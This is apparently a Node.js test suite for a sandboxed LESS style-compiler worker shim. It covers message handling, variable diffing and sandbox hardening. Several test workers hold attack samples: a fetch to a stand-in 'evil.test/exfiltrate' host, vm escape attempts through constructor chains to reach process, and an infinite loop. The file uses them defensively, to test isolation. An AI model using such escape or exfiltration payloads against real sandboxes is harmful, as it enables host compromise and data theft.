import test from 'node:test';
import assert from 'node:assert/strict';

import { bootStyleWorker, compileStyle, diffVariables, affectedComponents, sha256 } from '../src/style-compiler.mjs';

/**
 * A stand-in for YOOtheme's worker.js. It speaks the same message contract, so
 * it exercises the shim without shipping YOOtheme's proprietary bundle.
 */
const FAKE_WORKER = `
self.addEventListener('message', function (event) {
  var id = event.data[0];
  var payload = event.data[1];
  if (payload.cmd === 'css') {
    self.postMessage({ id: id, result: { css: '.x{color:red}', variables: { '@a': { value: '1' } }, errors: [] } });
    return;
  }
  if (payload.cmd === 'minify') {
    self.postMessage({ id: id, result: { css: payload.data.css, rtl: payload.data.css } });
    return;
  }
  if (payload.cmd === 'boom') {
    self.postMessage({ id: id, error: 'exploded' });
    return;
  }
  self.postMessage({ id: id, error: 'Invalid command.' });
});
`;

test('the worker shim speaks the documented message contract', async () => {
  const call = bootStyleWorker(FAKE_WORKER, 'https://example.test/wp-admin/customize.php');
  const result = await call('css', { style: {}, input: '', vars: {} });
  await call.close();

  assert.equal(result.css, '.x{color:red}');
  // bootStyleWorker is the low-level primitive: results come straight from the
  // vm realm, so deep-equality against host objects would fail even though the
  // data matches. compileStyle() is the layer that normalises.
  assert.equal(result.errors.length, 0);
});

test('compileStyle returns host-realm data, not vm-realm objects', async () => {
  const result = await compileStyle({
    workerSource: FAKE_WORKER,
    baseUrl: 'https://example.test/',
    sources: {
      filename: 'entry.less',
      filepath: '/less/',
      desturl: '/css',
      imports: { 'entry.less': '@a: 1;' },
      vars: {},
    },
  });

  assert.deepEqual(result.errors, []);
  assert.deepEqual(result.variables, { '@a': { value: '1' } });
  assert.equal(result.bytes, '.x{color:red}'.length);
  assert.equal(result.sha256, sha256('.x{color:red}'));
});

test('compileStyle refuses an import tree without its entry file', async () => {
  await assert.rejects(
    () => compileStyle({
      workerSource: FAKE_WORKER,
      baseUrl: 'https://example.test/',
      sources: { filename: 'missing.less', filepath: '/less/', imports: { 'other.less': '' }, vars: {} },
    }),
    /entry file missing.less is missing/
  );
});

test('worker errors reject rather than hanging', async () => {
  const call = bootStyleWorker(FAKE_WORKER, 'https://example.test/');
  await assert.rejects(() => call('boom', {}), /exploded/);
  await call.close();
});

test('concurrent calls resolve against their own ids', async () => {
  const call = bootStyleWorker(FAKE_WORKER, 'https://example.test/');
  const [a, b] = await Promise.all([
    call('minify', { style: {}, css: 'FIRST' }),
    call('minify', { style: {}, css: 'SECOND' }),
  ]);
  await call.close();

  assert.equal(a.css, 'FIRST');
  assert.equal(b.css, 'SECOND');
});

test('a bundle that registers no listener is rejected outright', async () => {
  const call = bootStyleWorker('var x = 1;', 'https://example.test/');
  await assert.rejects(
    () => call('css', {}),
    /did not register a message listener/
  );
});

test('the worker cannot reach the network', async () => {
  const NET_WORKER = `
    self.addEventListener('message', async function (event) {
      var id = event.data[0];
      try {
        await self.fetch('https://evil.test/exfiltrate');
        self.postMessage({ id: id, result: { reached: true } });
      } catch (e) {
        self.postMessage({ id: id, result: { blocked: String(e.message || e) } });
      }
    });
  `;
  const call = bootStyleWorker(NET_WORKER, 'https://example.test/');
  const result = await call('css', {});
  await call.close();

  assert.match(result.blocked, /Blocked network access/);
});

test('the worker cannot escape through host timer constructors', async () => {
  const ESCAPE_WORKER = `
    self.addEventListener('message', function (event) {
      var id = event.data[0];
      try {
        var version = setTimeout.constructor('return process')().versions.node;
        self.postMessage({ id: id, result: { escaped: true, version: version } });
      } catch (e) {
        self.postMessage({ id: id, result: { escaped: false, error: String(e.message || e) } });
      }
    });
  `;
  const call = bootStyleWorker(ESCAPE_WORKER, 'https://example.test/');
  const result = await call('probe', {});
  await call.close();

  assert.equal(result.escaped, false);
  assert.match(result.error, /process is not defined/);
});

test('the worker global has no host Object constructor escape', async () => {
  const ESCAPE_WORKER = `
    self.addEventListener('message', function (event) {
      var id = event.data[0];
      try {
        var version = globalThis.constructor.constructor('return process')().versions.node;
        self.postMessage({ id: id, result: { escaped: true, version: version } });
      } catch (e) {
        self.postMessage({ id: id, result: { escaped: false, error: String(e.message || e) } });
      }
    });
  `;
  const call = bootStyleWorker(ESCAPE_WORKER, 'https://example.test/');
  const result = await call('probe', {});
  await call.close();

  assert.equal(result.escaped, false);
  assert.match(result.error, /process is not defined/);
});

test('a synchronous infinite loop is terminated by the isolated runner timeout', async () => {
  const LOOP_WORKER = `
    self.addEventListener('message', function () {
      while (true) {}
    });
  `;
  const call = bootStyleWorker(LOOP_WORKER, 'https://example.test/', {
    bootTimeoutMs: 1_000,
    callTimeoutMs: 100,
  });

  await assert.rejects(
    () => call('css', {}),
    /timed out|Script execution timed out/
  );
  await call.close();
});

test('diffVariables reports only variables whose resolved value moved', () => {
  const before = {
    '@a': { value: '#fff', file: 'variables' },
    '@b': { value: '10px', file: 'base' },
    '@gone': { value: '1', file: 'old' },
  };
  const after = {
    '@a': { value: '#000', file: 'variables' },
    '@b': { value: '10px', file: 'base' },
    '@new': { value: '2', file: 'new' },
  };

  const diff = diffVariables(before, after);

  assert.equal(diff.changed.length, 1);
  assert.equal(diff.changed[0].name, '@a');
  assert.equal(diff.changed[0].from, '#fff');
  assert.equal(diff.changed[0].to, '#000');
  assert.deepEqual(diff.added.map((e) => e.name), ['@new']);
  assert.deepEqual(diff.removed.map((e) => e.name), ['@gone']);
});

test('diffVariables flags values that come from the style variation', () => {
  const diff = diffVariables(
    { '@x': { value: 'a' } },
    { '@x': { value: 'b', style: true } }
  );

  assert.equal(diff.changed[0].from_variation, true);
});

test('affectedComponents groups variables by UIkit component', () => {
  const components = affectedComponents([
    { name: '@button-primary-background' },
    { name: '@button-default-color' },
    { name: '@card-body-padding' },
    { name: '@inverse-navbar-nav-item-color' },
  ]);

  assert.deepEqual(components, ['button', 'card', 'navbar']);
});

test('sha256 is stable', () => {
  assert.equal(sha256('abc'), sha256('abc'));
  assert.notEqual(sha256('abc'), sha256('abd'));
});
